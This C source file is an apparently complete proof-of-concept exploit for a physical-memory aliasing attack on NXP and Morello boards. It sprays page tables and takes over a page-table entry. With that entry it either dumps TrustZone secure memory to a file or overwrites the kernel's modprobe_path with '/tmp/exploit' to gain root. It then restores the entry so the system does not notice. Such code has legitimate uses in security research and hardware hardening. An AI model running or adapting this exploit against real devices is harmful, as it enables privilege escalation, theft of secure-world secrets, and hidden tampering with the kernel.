#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>
#include <sys/wait.h>
#include <sys/mman.h>

/* Spraying parameters. Increasing these increases the number of
   sprayed page tables.*/
#define FILE_SIZE (96 * 0x100000)
#define SHM_COUNT 0x10000 - 2 /* 2 ^ 16 */

#define PAGE_SIZE sysconf(_SC_PAGESIZE)

/* Hugepage map control. */
#define HUGEMAP_SIZE    0x40000000
#define MAP_HUGE_2MB    (21 << MAP_HUGE_SHIFT)
#define MAP_HUGE_1GB    (30 << MAP_HUGE_SHIFT)

/* Where to dump secure memory contents for TZ attack. */
#define DUMP_FILE "memory.dmp"

/* Parameters for Linux attack. */
#define MODPROBE_PATH "/sbin/modprobe"
#define MODPROBE_PATH_LEN 14
#define NEW_MODPROBE_PATH "/tmp/exploit"
#define NEW_MODPROBE_PATH_LEN 12

/* Uncomment to attack TZ instead of Linux. */
/* #define ATTACK_TZ */

size_t page_size;

const uint64_t magic = 0xF0CACC1AF0CACC1A;
void* maps[SHM_COUNT];
unsigned char* map;

#ifdef DEBUG
typedef struct {
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

int pagemap_fd;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread,
                vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0) {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}

/* Convert the given virtual address to physical using /proc/PID/pagemap.
 *
 * @param[out] paddr physical address
 * @param[in]  pid   process to convert for
 * @param[in] vaddr virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int virt_to_phys_user(uintptr_t *paddr, uintptr_t vaddr)
{
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
        return 1;
    }
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
    return 0;
}
#endif

void spray_tables(void) {
  int fd = memfd_create("victim_memory", 0);
  ftruncate(fd, FILE_SIZE);
  FILE* file = fdopen(fd, "wb");
  for (size_t i = 0; i < (FILE_SIZE / 8); i++) {
    fwrite(&magic, sizeof(magic), 1, file);
  }
  fseek(file, 0, SEEK_SET);
  printf("spraying page tables...\n");
  for (size_t i = 0; i < SHM_COUNT; i++) {
    maps[i] = mmap(NULL, FILE_SIZE, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED | MAP_POPULATE, fd, 0);
  }
}

uint64_t find_odd(void) {
  printf("scanning for modified page...\n");
  for (uint64_t* p = (uint64_t*)map; (void*)p < (void*)(map + HUGEMAP_SIZE); p += (page_size / sizeof(uint64_t))) {
    if ((uint64_t)p != *p) {
      printf("found modified page! p: %p *p: 0x%zx\n", p, *p);
      return (uint64_t)p;
    }
  }
  return -1;
}

/* Example parameters for attack against Morello. */
/* #define MORELLO_TZDRAM_START 0xff000000 */
/* #define MORELLO_TZDRAM_END  0x101000000 */
/* #define MORELLO_DRAM0_ALIAS_OFFSET   0x8380000000 */

/* Parameters for attack against Morello. */
/* TZ attack parameters. */
#define NXP_TZDRAM_START 0xfc000000
#define NXP_TZDRAM_END  0xffc00000
/* Linux attack parameters. */
#define KERNEL_DATA_START 0x83440000
#define KERNEL_DATA_END 0x8384ffff
/* Used for both attacks. */
#define DRAM0_ALIAS_OFFSET 0xB80000000

/* Constructs a modified PTE. page aligned only, please! */
uint64_t construct_pte(uint64_t original, uint64_t phys_addr) {
  uint64_t blank = original & ~0xFFFFFFFFF000;
  printf ("0x%zx 0x%zx\n", blank, blank | phys_addr);
  return blank | phys_addr;
}

void dump_hex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

/* Perform a large number of reads to evict entries from the TLB. */
void bust_tlb(void) {
  for (size_t i = 0; i < 500; i++) {
    for (uint64_t* p = maps[i]; (void*)p < (void*)((char*)maps[i] + FILE_SIZE); p += (page_size / sizeof(uint64_t))) {
      volatile uint64_t read = *p;
    }
  }
}

int main(int argc, char *argv[]) {
#ifdef ATTACK_TZ
  FILE* dump_fp = fopen(DUMP_FILE, "wb");
  if (!dump_fp) {
    printf("couldn't open dump file. bailing!\n");
    return 1;
  }
#endif
  page_size = PAGE_SIZE;
  /* prepare hugepage mapping. */
  printf("preparing large map (size 0x%zx)\n", HUGEMAP_SIZE);
  map = mmap(NULL, HUGEMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MAP_HUGE_1GB ,-1, 0);
  if ((long)map == -1) {
    printf("map allocation failed. bailing!\n");
    return 1;
  }
  for (uint64_t* p = (uint64_t*)map; (void*)p < (void*)(map + HUGEMAP_SIZE); p++) {
    *p = (uint64_t)p;
  }
  printf("done! addr %p\n", map);
  srand(time(NULL));

#ifdef DEBUG
  pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  if (pagemap_fd < 0) {
    printf("failed to open /proc/self/pagemap!\n");
    return 1;
  }
#endif

  /* spray page tables, then find memory clobbering */
  spray_tables();
  uint64_t* victim = (uint64_t*)find_odd();
  if ((int64_t)victim == -1) {
    printf("didn't find corrupted data. sorry :(\n");
    return 1;
  }

  /* modify discovered PTE in aliased memory. */
  uint64_t old_victim = *victim;
  *victim = construct_pte(old_victim, NXP_TZDRAM_START + DRAM0_ALIAS_OFFSET);

  /* discover our "window" into pmem - this is the page that the modified PTE maps. */
  uint64_t* window = NULL;

  for (size_t i = 0; i < SHM_COUNT; i++) {
    for (uint64_t* p = maps[i]; (void*)p < (void*)((char*)maps[i] + FILE_SIZE); p += (page_size / sizeof(uint64_t))) {
      if (*p != magic) {
        printf("found modified page!\n");
        window = p;
        goto next;
      }
    }
  }
  printf("didn't find modified page. something is wrong?\n");
  return 1;
 next:
  printf("window: %p *window: 0x%zx\n", window, *window);

#ifdef ATTACK_TZ
  /* for TZ, just dump out memory and we can find secrets later. */
  printf("dumping to file...\n");
  for (unsigned char* tar = (unsigned char*)(NXP_TZDRAM_START + DRAM0_ALIAS_OFFSET); (void*)tar < (void*)(NXP_TZDRAM_END + DRAM0_ALIAS_OFFSET); tar += page_size) {
    *victim = construct_pte(old_victim, (uint64_t)tar);
    bust_tlb();
    fwrite(window, page_size, 1, dump_fp);
  }
#else
  /* for Linux, patch modprobe_path for later exploitation */
  printf("patching kernel...\n");
  for (unsigned char* tar = (unsigned char*)(KERNEL_DATA_START); (void*)tar < (void*)(KERNEL_DATA_END); tar += page_size) {
    *victim = construct_pte(old_victim, (uint64_t)tar);
    bust_tlb();
    /* it would be very unlucky for this to be on a page boundary */
    for (char* path = (char*)window; (void*)path < (void*)((char*)window + page_size); path++) {
      if (strncmp(path, MODPROBE_PATH, MODPROBE_PATH_LEN) == 0) {
        memcpy(path, NEW_MODPROBE_PATH, NEW_MODPROBE_PATH_LEN);
        *(path + NEW_MODPROBE_PATH_LEN) = 0;
        printf("patched modprobe_path. please verify:\n");
        dump_hex(window, page_size);
        goto end;
      }
    }
  }
 end:
#endif

  /* clean up, so Linux doesn't notice anything amiss. */
  *victim = old_victim;

#ifdef ATTACK_TZ
  fclose(dump_fp);
#endif

#ifdef DEBUG
  close(pagemap_fd);
#endif

  return 0;
}
